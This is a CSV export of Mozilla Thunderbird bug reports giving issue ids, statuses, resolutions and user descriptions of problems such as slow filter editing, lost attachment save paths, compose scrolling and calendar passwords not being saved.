Issue id,Summary,Status,Priority,Resolution,Description
1607599,TypeError: openFeedView.children.forEach is not a function mailWindowOverlay.js:816 visiting appmenu -> Message,NEW,--,,"In Thunderbird trunk, just visiting the appmenu -> Message submenu throws an error in the console: TypeError: openFeedView.children.forEach is not a function mailWindowOverlay.js:816:25 This only happens in the appmenu. In the main menu (Message submenu) this does not happen."
1607601,MICROBUG: Save As has default file type all but file is saved as .eml,NEW,--,,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 OPR/65.0.3467.78 Steps to reproduce: 1. Right click message. 2. Click Save As… Actual results: Save dialog file type is All. Expected results: File type should be .eml as message is about to be save in."
1607613,Tools - Account Settings - Junk Settings - Select and Toggle Broken,RESOLVED,--,FIXED,User Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0 Steps to reproduce: Under Tools -> Account Settings select a server. Click on Junk Settings. In the Do not automatically mark mail as junk if the sender is list click on a mailing list. Note the space-bar toggles the check-mark. Use the cursor keys to move the selection bar and note the highlight moves. Press the space-bar and note the PREVIOUSLY-SELECTED item is toggled (not the current selection.) Actual results: Changing the selection by clicking moves the highlight and the space-bar toggles the highlighted item. Navigating with the cursor keys changed the highlight but the space-bar toggles the previous selection. Expected results: Changing the selection with the cursor keys or clicking the mouse should be equivalent.
1607688,Editing of mail filters has with the last update become incredibly slow. The more filter lines the slower the filtering!,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: I only updated Thunderbird from the previosu to the newest version 68.3.1 (32 bits) and since then the mail filtering and editing of the mail filters suddenly suffered a delay of nearly 2 minutes. Actual results: Mail filtering and mail filter editing has becoam very slow/delayed. Expected results: Hardly any delay should be seen, particulalrly when the mail filter is started up for editing of the filters but then nearly 2 minutes pass before a filter appears and can be edited."
1607691,"Changing checkbox ""using systemcolours"" does not change anything. Systemcolours are folowed anyway",RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36 Steps to reproduce: In the dutch language version: In the latest update, my backgroundcolours in Thunderbird got dark (because my windows system setting is dark) If I go to options - options - view -fonts and colors button colours; there is a checkbox to choose weather or not I want to use the systemcolours. Actual results: If I check or unckeck the box doesn't change a thing (even after restart of thunderbird) Expected results: Dark mode in windows should give dark mode in Thunderbird and light mode in windows should give light mode in thunderbird"
1607695,TB does not remember the save path from first attachment anymore when saving multiple attachments,RESOLVED,--,DUPLICATE,User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: After update to version 68.3.1 Actual results: When incoming mail has multiple attachments the previous TB versions used to remember the path that was selected after the first attachment was saved. Now the whole path has to be entered again and again for each next attachment that needs saving. Expected results: Thunderbird should just like in the previous TB version have remembered the path where the previous attachment of a mail message was saved.
1607776,Emails in Local Folder Deleted,RESOLVED,--,WORKSFORME,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0 Steps to reproduce: I tried moving a folder from my inbox to a local folder. (I use local folders to classify emails I retain from several email accounts.) Version is 72.0b3 Actual results: The inbox email remained (at least was displayed) in the inbox list. When I tried moving it to a different folder, that worked; however, when I tried to move the email from the ""different"" folder to the target folder, all the emails in the target folder disappeared, and Windows 10 File Explorer indicates the target folder is empty. Expected results: The inbox email should have been moved to the target folder and removed from the inbox list. Note: there is no indication given on the progress of moving emails; a progress indicator and completion/failure status would be helpful."
1607829,Composing message - changed message scroll behavior when pressing <Enter>,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: Replying to the message and pressing <Enter> Actual results: When creating new line, cursor stays at the top and new lines or written text are moved above the cursor, out of visible view. If I want to view the text above the cursor, I have to scroll up or move the cursor with keyboard arrows. Cannot pinpoint which update did that, but the behavior wasn't like that before. Let's illustrate it like this, dashed line shows the top border of the visible message view. Steps: 1) --------------------- <Cursor here> 2) --------------------- Some text <Enter> 3) Some text <Enter> --------------------- <Cursor here> I cannot reproduce it always, in some messages it works as expected, in some it doesn't. Seems it has something to do with messages containing image and/or long text. Expected results: 1) --------------------- <Cursor here> 2) --------------------- Some text <Enter> 3) --------------------- Some text <Enter> <Cursor here>"
1607840,Thunderbird does not display attachments,RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0 Steps to reproduce: Some e-mails with attachments do not show these attachments in the main view of thunderbird. They also do not show a paper clipp symbol. To view these attachments I have to click ""forward mail"" which opens the composer. There, the attachments of the mail are displayed -- and I can open them. Actual results: Some mails do not show their attachments Expected results: Every mail should display its attachments when the mail is opened in the display, or as a paper clip symbol."
1607873,Thunderbird (Lightning Add-On) does no longer save the passwords for network calendars,RESOLVED,--,WORKSFORME,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36 Steps to reproduce: Thunderbird 68.3.1 on a Win10 1909 (Build 18363.535) System - I made 200% sure that I had the checkbox to save the password was checked - I tried deinstalling and reinstalling lightning to see if I got an old version of the addon that does no longer work properly. No luck - I deinstalled Thunderbird fully and tried with a new installation and a new profile - same - no saving of the passwords. Now even the checkbox to save the passwords is gone - I reset my old profile to be used - checkbox gone there now as well - no saving of passwords Actual results: See above at what I did. Expected results: In the past Lightning/Thunderbird did safe the passwords for a network calendar on an FTP-Server in its list of passwords. That does no longer happen. No saved passwords for the FTP-Calendar - passwords for the emails still working (so I hesitate to delete one from the password manager)"
1607949,Pressing J for removing junk icon not working,RESOLVED,--,INVALID,User Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0 Steps to reproduce: Open thunderbird and go to your inbox. This was tested using my gmail account. Highlight one of your emails and press the j button. This should mark it as junk. Press j again and it does not unmark it. This is in contrast to the star and mark read hotkeys. Actual results: Nothing happened. Expected results: The email should have been marked as not junk.
1607998,Archive button is not working in OWL,RESOLVED,--,MOVED,"User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:71.0) Gecko/20100101 Firefox/71.0 Steps to reproduce: I have just started using Thunderbird since Outlook for the Mac drove me insane. The account is an office 365 account which I guess uses the owl plugin for some things. Anyway, I see my inbox and all my emails nicely. However, when I try to Archive a message in the inbox, nothing happens (tried each of pressing 'A', right clicking the message -> archive as well as Menu -> Message -> Archive). Actual results: Nothing happens the message stays in inbox and there's no visual change on my screen. Expected results: The message should have been moved to the archive folder and be removed from the inbox"
1608015,Contact loses part of display name when moving to different address book (if display name contains ö or ü?),RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0 Steps to reproduce: - import contact list via .txt file (creates a new address book) - create new (distribution/email) list in target address book - drag and drop all contacts of imported address book to target mailing list Actual results: All contacts got copied, while one contact got dropped part of the field 'display name'. The contact's name was something like ""Könüs Original-Verhuis"" - so with ö and ü and a dash before the second part of the last name. This second part of the last name (""-Verhuis"" in my example) was dropped (only ""Könüs Original"" left) in the display name of the (new) contact on my mailing list. Expected results: The full name should have persisted."
